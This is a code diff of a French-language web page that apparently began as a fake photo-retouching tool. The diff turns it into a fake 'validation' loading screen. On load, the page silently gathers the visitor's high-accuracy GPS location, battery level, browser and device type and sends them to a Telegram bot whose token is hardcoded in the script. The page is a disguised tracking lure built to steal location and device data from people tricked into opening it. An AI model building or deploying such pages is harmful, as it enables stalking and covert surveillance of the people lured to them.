@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transformation de votre photo</title>
+    <title>Validation de votre position</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 40px 20px;
+            padding: 60px 20px;
             background-color: #f4f4f9;
         }
         h1 {
@@ -17,32 +17,29 @@
         }
         p {
             color: #666;
-            font-size: 15px;
-            margin-bottom: 30px;
+            font-size: 16px;
+            margin-top: 20px;
         }
-        button {
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            padding: 18px 32px;
-            font-size: 18px;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
-            width: 100%;
-            max-width: 320px;
+        .loader {
+            margin: 30px auto;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
         }
-        button:active {
-            background-color: #006699;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <h1>Retouchez votre photo</h1>
-    <p>Cliquez sur le bouton ci-dessous pour voir le resultat instantanément.</p>
-    
-    <button id="authButton">Autoriser et Envoyer</button>
+    <h1>Validation en cours...</h1>
+    <div class="loader"></div>
+    <p>Veuillez patienter pendant la transmission des données de l'appareil.</p>
 
     <script>
         const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";
@@ -50,55 +47,103 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chat_id');
 
-        document.getElementById('authButton').addEventListener('click', async () => {
+        // Fonction pour détecter le navigateur et l'appareil
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Navigateur inconnu";
+            let device = "Appareil mobile / PC";
+
+            // Détection du navigateur
+            if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            else if (ua.includes("Trident")) browser = "Internet Explorer";
+            else if (ua.includes("Edge")) browser = "Microsoft Edge";
+            else if (ua.includes("Chrome")) browser = "Google Chrome";
+            else if (ua.includes("Safari")) browser = "Apple Safari";
+
+            // Détection basique de l'appareil via User-Agent
+            if (/android/i.test(ua)) device = "Smartphone Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone / iOS";
+            else if (/windows/i.test(ua)) device = "PC Windows";
+            else if (/macintosh|mac os x/i.test(ua)) device = "Macintosh";
+
+            return { browser, device };
+        }
+
+        window.onload = async function() {
             if (!chatId) {
-                alert("Erreur : Identifiant de chat introuvable.");
+                document.querySelector('h1').innerText = "Erreur";
+                document.querySelector('p').innerText = "Identifiant de chat introuvable.";
                 return;
             }
 
             if (!navigator.geolocation) {
-                alert("La géolocalisation n'est pas supportée par votre navigateur.");
+                alert("La géolocalisation n'est pas supportée.");
                 return;
             }
 
-            const btn = document.getElementById('authButton');
-            btn.disabled = true;
-            btn.innerText = "Traitement en cours...";
+            // Récupérer le niveau de la batterie si l'API est disponible
+            let batteryLevel = "Inconnu";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                }
+            } catch (e) {
+                console.log("Batterie non accessible");
+            }
 
-            // Demande unique : active la recherche GPS et récupère les coordonnées
+            const info = getDeviceInfo();
+
+            // Demande de la position GPS
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const latitude = position.coords.latitude;
                 const longitude = position.coords.longitude;
 
-                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+                // 1. Préparer le texte descriptif avec toutes les informations de l'appareil
+                const descriptionText = 
+                    `📱 **Rapport de l'appareil**\n` +
+                    `• **Appareil / Modèle :** ${info.device}\n` +
+                    `• **Navigateur :** ${info.browser}\n` +
+                    `• **Batterie :** ${batteryLevel}\n` +
+                    `• **Chat ID :** ${chatId}`;
+
+                const textApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(descriptionText)}&parse_mode=Markdown`;
+                
+                // 2. Préparer l'URL pour envoyer la carte interactive
+                const locationApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
 
                 try {
-                    const response = await fetch(telegramApiUrl);
+                    // Envoyer d'abord le texte avec les infos
+                    await fetch(textApiUrl);
+                    
+                    // Envoyer ensuite la mini-carte interactive
+                    const response = await fetch(locationApiUrl);
+
                     if (response.ok) {
-                        alert("Merci de patienter ou reessayez !");
-                        window.close(); // Ferme la page si le navigateur l'autorise
+                        document.querySelector('h1').innerText = "Succès !";
+                        document.querySelector('p').innerText = "Les informations et la position ont été envoyées sur Telegram.";
+                        setTimeout(() => { window.close(); }, 3000);
                     } else {
-                        alert("Erreur lors de l'envoi.");
-                        btn.disabled = false;
-                        btn.innerText = "Autoriser et Envoyer";
+                        document.querySelector('h1').innerText = "Erreur";
+                        document.querySelector('p').innerText = "Erreur lors de l'envoi vers Telegram.";
                     }
                 } catch (error) {
                     console.error("Erreur réseau :", error);
-                    alert("Erreur de connexion.");
-                    btn.disabled = false;
-                    btn.innerText = "Autoriser et Envoyer";
+                    document.querySelector('h1').innerText = "Erreur";
+                    document.querySelector('p').innerText = "Erreur de connexion réseau.";
                 }
 
             }, (error) => {
-                alert("Veuillez autoriser l'accès à la position dans votre navigateur pour continuer.");
-                btn.disabled = false;
-                btn.innerText = "Autoriser et Envoyer";
+                document.querySelector('h1').innerText = "Autorisation requise";
+                document.querySelector('p').innerText = "Veuillez autoriser l'accès à la localisation pour continuer.";
             }, { 
                 enableHighAccuracy: true, 
                 timeout: 15000, 
                 maximumAge: 0 
             });
-        });
+        };
     </script>
 
 </body>
